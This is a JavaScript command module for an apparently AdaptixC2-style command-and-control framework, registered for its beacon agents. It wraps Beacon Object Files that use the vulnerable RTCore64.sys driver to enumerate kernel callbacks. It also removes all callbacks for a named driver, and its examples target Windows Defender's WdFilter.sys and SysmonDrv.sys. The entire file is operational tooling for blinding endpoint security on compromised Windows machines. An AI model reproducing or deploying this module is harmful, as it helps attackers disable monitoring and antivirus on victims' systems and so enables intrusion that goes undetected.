var metadata = {
    name: "Callbacks-BOF",
    description: "Kernel tradecraft via RTCore64.sys — callback enumeration and removal."
};

// ============================================================================
// list_callbacks
// ============================================================================

var cmd_list_callbacks = ax.create_command("list_callbacks",
    "Enumerate kernel callbacks (Process, Thread, ImageLoad, ProcHandle, ThreadHandle) via RTCore64.sys.\nRequires: sc start RTCore64",
    "list_callbacks");

cmd_list_callbacks.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    var bof_path = ax.script_dir() + "_bin/list_callbacks_bof." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "Task: list kernel callbacks", null);
});

// ============================================================================
// remove_callback
// ============================================================================

var cmd_remove_callback = ax.create_command("remove_callback",
    "Remove/disable all kernel callbacks for a specific driver via RTCore64.sys.\nRequires: sc start RTCore64",
    "remove_callback WdFilter.sys\nremove_callback SysmonDrv.sys");

cmd_remove_callback.addArgString("driver", true, "Short driver filename to target (e.g. SysmonDrv.sys)");

cmd_remove_callback.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    var driver = parsed_json["driver"] || "";
    if (driver === "") {
        ax.execute_alias(id, cmdline, `echo`, "Usage: remove_callback <driver.sys>", null);
        return;
    }
    var bof_path   = ax.script_dir() + "_bin/remove_callback_bof." + ax.arch(id) + ".o";
    var bof_params = ax.bof_pack("wstr", [driver]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: remove callbacks for " + driver, null);
});

// ============================================================================
// Register group
// ============================================================================

var group_callbacks = ax.create_commands_group("Kernel Tradecraft", [
    cmd_list_callbacks,
    cmd_remove_callback
]);
ax.register_commands_group(group_callbacks, ["beacon", "gopher", "kharon"], ["windows"], []);
